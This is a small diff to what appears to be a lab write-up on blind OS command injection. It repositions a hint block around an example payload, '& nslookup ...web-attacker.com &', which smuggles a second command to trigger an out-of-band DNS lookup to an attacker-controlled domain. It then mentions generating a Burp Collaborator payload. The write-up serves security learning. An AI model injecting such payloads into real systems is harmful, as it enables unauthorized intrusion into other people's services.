@@ -19,9 +19,6 @@ However, there’s no output of our command in the response, it might be vulnera
 
 {% hint style="info" %}
 💡 We can use an injected command that will trigger an out-of-band network interaction with a system that you control, using OAST techniques. For example:
-{% endhint %}
-
-
 
 ```bash
 & nslookup kgji2ohoyw.web-attacker.com &
@@ -29,6 +26,9 @@ However, there’s no output of our command in the response, it might be vulnera
 ```
 
 This payload uses the `nslookup` command to cause a DNS lookup for the specified domain. The attacker can monitor to see if the lookup happens, to confirm if the command was successfully injected.
+
+{% endhint %}
+
 
 Therefore I open a new Burp Collaborator client and generate a new payload. URLencode the payload to avoid breaking the request.
 
